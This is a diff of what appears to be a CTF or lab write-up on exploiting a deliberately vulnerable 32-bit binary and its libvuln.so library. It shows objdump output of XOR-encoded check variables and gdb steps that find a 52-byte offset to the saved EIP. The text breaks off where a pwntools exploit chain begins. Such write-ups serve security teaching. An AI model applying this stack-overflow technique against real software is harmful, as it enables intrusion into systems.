@@ -47,47 +47,49 @@ if __name__ == '__main__':
 
 XORkey can be found in radare2 by disassembling the function __encrypt() using ```pdf @ sym.__encrypt``` and address where XOR key is stored can be found. Run the above script for 3 different variables to get the parameters. These are variables in the global scope of libvuln.so file. The parameters' offset can be found in disassembly of each tryOne, tryTwo and tryThree and their addresses. The varaiables' name can be determined in gdb using command ```info variables``` and its address. The variable names are check_p1, check_p2, check_p3.  
 
-Create a header file named ```libxyz.h```. Add the following lines to it-
-
+Run the command ```objdump -d -s -j .data ./libvuln.so```
+output :-
 ```
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <stdbool.h>
+./libvuln.so:     file format elf32-i386
 
-extern char check_p1[];
-extern char check_p2[];
-extern char check_p3[];
-```
-Now create another file try.c and add the following lines to it-
+Contents of section .data:
+ 403c 3c400000 032c514f 483e4555 27500000  <@...,QOH>EU'P..
+ 404c 032c531a 193e4451 24530000 032c511a  .,S..>DQ$S...,Q.
+ 405c 193e4151 215300                      .>AQ!S.         
 
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <sys/types.h>
-#include <stdbool.h>
-#include "libxyz.h"
+Disassembly of section .data:
 
-int main(){
-    FILE *fptr;
-    fptr = fopen("params.dat","wb");
-    fprintf(fptr,"%s\n",check_p1);
-    fprintf(fptr,"%s\n",check_p2);
-    fprintf(fptr,"%s\n",check_p3);
-    fclose(fptr);
-    return 0;
-}
+0000403c <__dso_handle>:
+    403c:	3c 40 00 00                                         <@..
+
+00004040 <check_p1>:
+    4040:	03 2c 51 4f 48 3e 45 55 27 50 00 00                 .,QOH>EU'P..
+
+0000404c <check_p2>:
+    404c:	03 2c 53 1a 19 3e 44 51 24 53 00 00                 .,S..>DQ$S..
+
+00004058 <check_p3>:
+    4058:	03 2c 51 1a 19 3e 41 51 21 53 00                    .,Q..>AQ!S.
 ```
 
-Compile the file with ```gcc -m32 -fno-stack-protector -no-pie -o new_vuln try.c libvuln.so -Wl,-rpath=./``` and run ```./new_vuln```
+7) In order for eip to perform the instructions we want, fill up the buffer and the values in the register before saved eip in the stack with a payload buffer. Lets find out the buffer value required.  
 
-The respective variable values are stored in the file ```params.dat```.
+![Start gdb](./images/i1.png?raw=true)
 
-7) Now a chain can be build. Exploit :-
+Hitting break point set at new_main function- 
+
+![Break at new_main](./images/i2.png?raw=true)
+
+Provide an input of ```python3 -c 'print("A"*100)'``` as buffer. Checking registers upto where our buffer input is stored completely in a register.
+
+![Check esp](./images/i3.png?raw=true)
+
+Look at the esp address(which is also the esp address at the start) after leave instruction and find the offset by ```0xffffd1ac-0xffffd178```.
+It will be 0x34 whose decimal value is 52.
+
+![Find offset](./images/i4.png?raw=true)
+
+8) Now a chain can be build. Exploit :-
 
 ```
 from pwn import *
